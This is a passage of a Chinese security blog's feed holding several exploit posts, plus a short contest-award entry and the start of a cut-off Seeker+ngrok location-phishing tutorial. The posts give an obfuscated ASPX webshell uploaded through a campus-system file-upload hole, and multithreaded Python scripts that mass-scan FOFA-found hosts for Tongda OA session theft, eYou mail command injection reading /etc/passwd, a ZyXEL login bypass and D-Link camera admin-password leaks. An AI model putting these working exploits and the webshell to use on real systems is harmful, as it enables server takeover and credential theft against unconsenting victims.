        <content type="html"><![CDATA[<p>摸鱼选手拿了个三等奖~好耶！（bie带我飞</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417615546.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104174777643.jpg"></p><p>我们拿了全场第一个一血！！嘿嘿~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041741664553.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417417769475.jpg"></p><p>放波图~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041756443.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417123456.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417542254542.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041714544288.jpg"></p><p>最后来张红衣教主</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417585465296.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红明谷杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前台任意文件上传漏洞-智慧校园系统</title>
      <link href="2021/04/15/Smartcampusfileupload/"/>
      <url>2021/04/15/Smartcampusfileupload/</url>
      
        <content type="html"><![CDATA[<blockquote><p>不是正义会胜利，而是胜利的人即是正义</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>智慧校园管理系统前台注册页面存在文件上传，由于没有对上传的文件进行审查导致可上传恶意文件控制服务器</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>老规矩，fofa采集工具上先对其收集一波</p><blockquote><p>fofa语法：body=”DC_Login/QYSignUp”</p></blockquote><p>找到其中一个疑似可利用的目标站点（带有企业用户注册功能的站点</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041564196417.png"></p><p>点击企业用户注册便可发现可对其进行任意文件上传</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104156529886.png"></p><p>这里我们上传aspx🐎并且上传后它还能回显对应位置</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041569146361466.png"></p><h3 id="附上aspx🐎"><a href="#附上aspx🐎" class="headerlink" title="附上aspx🐎"></a>附上aspx🐎</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; Debug&#x3D;true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var AUXR&#x3D;&#39;DQjiUYyXzAbVMPNsJLrlfRmughGESdKHkpawFTWICnBtoxeZqvOc&#39;;</span><br><span class="line">var OIWN&#x3D;Request.Form(&quot;PleasedaidaiHarvey&quot;);</span><br><span class="line">var JZLF&#x3D;AUXR(4) + AUXR(14) + AUXR(15) + AUXR(9) + AUXR(20) + AUXR(27);</span><br><span class="line">eval(OIWN, JZLF);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>最后蚁剑成功连上</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202101154612641264.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA v11.7 在线用户登录漏洞</title>
      <link href="2021/04/14/SSV-99140/"/>
      <url>2021/04/14/SSV-99140/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有时候，当你说你赢了的时候，你就已经输了</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>此poc来源于网络（通过遍历uid的值，判断用户是否上线过，实现任意用户登录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        vuln_url = url + <span class="string">&quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;&amp;P_VER=0&quot;</span></span><br><span class="line">        resp = requests.get(vuln_url)</span><br><span class="line">        soup = BeautifulSoup(resp.text,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;RELOGIN&#x27;</span> <span class="keyword">in</span> soup.get_text():</span><br><span class="line">            print(<span class="string">&quot;不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            PHPSESSION = re.findall(<span class="string">r&#x27;PHPSESSID=(.*?);&#x27;</span>, <span class="built_in">str</span>(resp.headers))</span><br><span class="line">            print(<span class="string">&#x27;uid=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;在线&quot;</span>+<span class="string">&quot;对应的COOKIE值是：PHPSESSID=&quot;</span>+<span class="built_in">str</span>(PHPSESSION[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><blockquote><p>fofa语法：app=”TDXK-通达OA”</p></blockquote><p>①.判断是否为在线用户（批量</p><p><a href="http://xxx.xx.xx.xx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0">http://xxx.xx.xx.xx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0</a></p><p>如果页面是空白的即为管理员在线可利用；反之RELOGIN即为下线状态无法利用</p><p>②.获取其cookie</p><p>③.此时访问 <a href="http://xxx.xx.xx.xx/general/">http://xxx.xx.xx.xx/general/</a> 即可登录后台</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210414561249696.png"></p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210414144213.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞-亿邮邮箱系统（高危）</title>
      <link href="2021/04/13/yiyouemail/"/>
      <url>2021/04/13/yiyouemail/</url>
      
        <content type="html"><![CDATA[<blockquote><p>所谓规则，自古以来就是身处神的位置的人定下的</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源：<a href="https://mp.weixin.qq.com/s/KDlSyDn7DWwnnFeDednk8g">https://mp.weixin.qq.com/s/KDlSyDn7DWwnnFeDednk8g</a></p><h3 id="安全公告编号-CNTA-2021-0012"><a href="#安全公告编号-CNTA-2021-0012" class="headerlink" title="安全公告编号:CNTA-2021-0012"></a><strong>安全公告编号:CNTA-2021-0012</strong></h3><p>2021年4月10日，国家信息安全漏洞共享平台（CNVD）收录了亿邮电子邮件系统远程命令执行漏洞（CNVD-2021-26422）。攻击者利用该漏洞，可在未授权的情况实现远程命令执行，获取目标服务器权限。目前，漏洞利用细节已公开，厂商已于4月9日发布版本补丁完成修复。</p><h3 id="一、漏洞情况分析"><a href="#一、漏洞情况分析" class="headerlink" title="一、漏洞情况分析"></a><strong>一、漏洞情况分析</strong></h3><p>亿邮电子邮件系统是由北京亿中邮信息技术有限公司（以下简称亿邮公司）开发的一款面向中大型集团企业、政府、高校用户的国产邮件系统。亿邮电子邮件系统采用了自主研发MTA引擎、分布式文件系统存储方式、多对列机制、ECS存储子系统、Cache系统等多项核心技术，提供了丰富的邮件功能。</p><p>近日，有安全人员披露了亿邮电子邮件系统高危漏洞。未经身份验证的攻击者利用该漏洞，可通过精心构造恶意请求，使用POST方法在目标服务器执行命令，获取目标服务器权限，控制目标服务器。目前，漏洞细节已公开，厂商已发布版本补丁完成修复。</p><p>CNVD对该漏洞的综合评级为“高危”。</p><h3 id="二、漏洞影响范围"><a href="#二、漏洞影响范围" class="headerlink" title="二、漏洞影响范围"></a><strong>二、漏洞影响范围</strong></h3><p>漏洞影响的产品版本为亿邮电子邮件系统V8.3-V8.13的部分二次开发版本。</p><p>亿邮电子邮件系统信创版本及V8.13以后版本不受影响。</p><h3 id="三、漏洞处置建议"><a href="#三、漏洞处置建议" class="headerlink" title="三、漏洞处置建议"></a><strong>三、漏洞处置建议</strong></h3><p>目前，亿邮公司已通过技术支持渠道向用户提供了补丁程序。</p><p>CNVD建议使用亿邮电子邮件系统的用户按照如下方式进行自查，发现存在漏洞后，及时联系亿邮公司进行漏洞修补。</p><p><em>在邮件系统服务器上执行如下命令：</em></p><p>ls/usr/local/eyou/mail/lib/php/monitor (8.10.x及以后版本)</p><p>ls/usr/local/eyou/mail/app/lib/php/monitor (8.10.x及以前版本)</p><p>如不了解具体版本号，上述两条命令可不分版本都执行一下</p><p><em>如所有的验证命令都返回“No such file or directory”或“没有那个文件或目录”则证明不存在漏洞，反之则漏洞存在。</em></p><p>使用涉及版本的用户可通过400服务电话（400-111-6088）联系亿邮公司售后服务，亿邮公司售后维护人员可提供补丁包安装咨询、远程技术支持以及上门服务。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">threads=[]</span><br><span class="line">url_file=<span class="built_in">input</span>(<span class="string">&quot;enter target file&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;yiyou_IP.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_1</span>(<span class="params">target_url, result_q</span>):</span></span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/webadm/?q=moni_detail.do&amp;action=gragh&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&quot;type=&#x27;|cat /etc/passwd||&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        print(<span class="string">&quot;\033[32m[o] 正在请求 &#123;&#125;//webadm/?q=moni_detail.do&amp;action=gragh \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;root&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 ,成功执行 cat /etc/passwd \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            print(target_url+<span class="string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"><span class="keyword">for</span> targets <span class="keyword">in</span> f.readlines():</span><br><span class="line">    targets=targets.strip()</span><br><span class="line">    t=threading.Thread(target=POC_1,args=(targets,Queue()))</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.join()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>上述脚本用的命令是cat/etc/passwd，你也可执行whoami等命令（就相当于你拿到了服务器的shell了可随意执行服务器命令</p><blockquote><p>fofa语法： body=“亿邮邮件系统”</p></blockquote><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210413124532.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3297 ZyXEL NBG2105身份验证绕过</title>
      <link href="2021/04/12/CVE-2021-3297/"/>
      <url>2021/04/12/CVE-2021-3297/</url>
      
        <content type="html"><![CDATA[<blockquote><p>或许存在本身就毫无意义可言</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 在Zyxel NBG2105 V1.00（AAGU.2）C0设备上，将登录cookie设置为1可提供管理员访问权限。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;ZyXEL_url.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">threads=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">url,result_q</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=requests.get(url,timeout=<span class="number">5</span>)</span><br><span class="line">        html=result.text</span><br><span class="line">        status=result.status_code</span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">           print(url+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;存在漏洞&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           print(url+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;不存在漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    line=line.strip()</span><br><span class="line">    tar=line+<span class="string">&quot;/login_ok.htm&quot;</span></span><br><span class="line">    t=threading.Thread(target=thread,args=(tar,Queue()))</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reads:</span><br><span class="line">    i.join()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>通过更改 login参数可用实现后台登录进而修改其配置</p><blockquote><p>fofa语法：app=”ZyXEL-NBG2105”</p></blockquote><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041256225858529.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-25078 D-Link DCS系列监控</title>
      <link href="2021/04/11/CVE-2020-25078/"/>
      <url>2021/04/11/CVE-2020-25078/</url>
      
        <content type="html"><![CDATA[<blockquote><p>相信在不久的将来只有两种人拥有自由，一种是彻底抛弃了信息时代的人，一种就是黑客。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在1.06.01 Hotfix之前的D-Link DCS-2530L和通过2.02设备的DCS-2670L上发现了一个问题。未经身份验证的/ config / getuser端点允许远程管理员密码泄露。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;D_link_IP.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;D_link.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">threads=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">url,line_q,result_q</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       result=requests.get(url,timeout=<span class="number">3</span>).text</span><br><span class="line">       finall=line_q+<span class="string">&quot;\n&quot;</span>+result</span><br><span class="line">       print(finall)</span><br><span class="line">       f1.write(finall+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">       print(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    line=line.strip()</span><br><span class="line">    tar=line+<span class="string">&quot;/config/getuser?index=0&quot;</span></span><br><span class="line">    t=threading.Thread(target=thread,args=(tar,line,Queue()))</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.join()</span><br><span class="line">f1.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后根据对应摄像头的型号到fofa上搜索（这里用fofa采集工具收集对应IP</p><blockquote><p>fofa语法：app=”D_Link-DCS-2530L”</p></blockquote><p>附上V神的收集工具：<a href="https://github.com/Vicl1fe/PeneS/releases/tag/1.2%EF%BC%88V%E7%A5%9E">https://github.com/Vicl1fe/PeneS/releases/tag/1.2（V神</a> yyds，立马点个star</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/12855225969684.png"></p><p>V神的poc（单线程比较慢就是了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">FOFA:app=&quot;D_Link-DCS-2530L&quot;</span></span><br><span class="line"><span class="string">By Vicl1fe</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;D_link_IP.txt&quot;</span></span><br><span class="line">header = &#123;<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>&#125;</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:1081&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:1081&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_url</span>():</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> i.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">                result.append(<span class="string">&quot;http://&quot;</span>+i.strip())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(i.strip())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_pass</span>(<span class="params">text</span>):</span></span><br><span class="line">    result = re.findall(<span class="string">r&quot;name=(.*?)\r\npass=(.*?)\r\npriv&quot;</span>,text)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = requests.get(url+<span class="string">&quot;/config/getuser?index=0&quot;</span>,headers = header,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> html.text <span class="keyword">and</span> <span class="string">&quot;pass&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                result = get_admin_pass(html.text)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(result) == <span class="number">1</span>:</span><br><span class="line">                    admin = result[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                    admin_pass = result[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">                    print(url + <span class="string">&quot; 账号：&#123;&#125;  密码：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(admin,admin_pass))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(url + <span class="string">&quot; 获取账号密码失败&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">url_list = get_all_url()</span><br><span class="line"><span class="comment"># url_list = [&quot;http://66.177.75.22/&quot;]</span></span><br><span class="line">exp(url_list)</span><br></pre></td></tr></table></figure><p>或者直接手工找到目标直接加上poc：http(s)://IP/config/getuser?index=0即可得到密码进行登录</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210411561268546456.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1618220238(1).jpg" alt="xmsl"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学工具Seeker+ngrok</title>
      <link href="2021/04/10/Seeker+ngrok/"/>
      <url>2021/04/10/Seeker+ngrok/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在维护所谓的正义的时候，也许我们已经走上了邪恶的道路</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学校又开始断电了qwq ！！！！</p><p>十一点半就只好躺床上刷B站，然后就发现了这个社工工具（个人感觉这工具就TMD特别鸡肋，在此进行测试，大佬勿喷~</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>seeker下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;github.com&#x2F;thewhiteh4t&#x2F;seeker</span><br></pre></td></tr></table></figure><p>安装命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 install.sh</span><br><span class="line">sudo .&#x2F;install</span><br></pre></td></tr></table></figure><p>ngrok下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ngrok.com&#x2F;download</span><br></pre></td></tr></table></figure><p>以上皆是在Linux-kali下操作</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>首先打开seeker运行其py脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 seeker.py -t manual</span><br><span class="line">1&#x2F;&#x2F;这里我们选用google的模板</span><br><span class="line">URL : 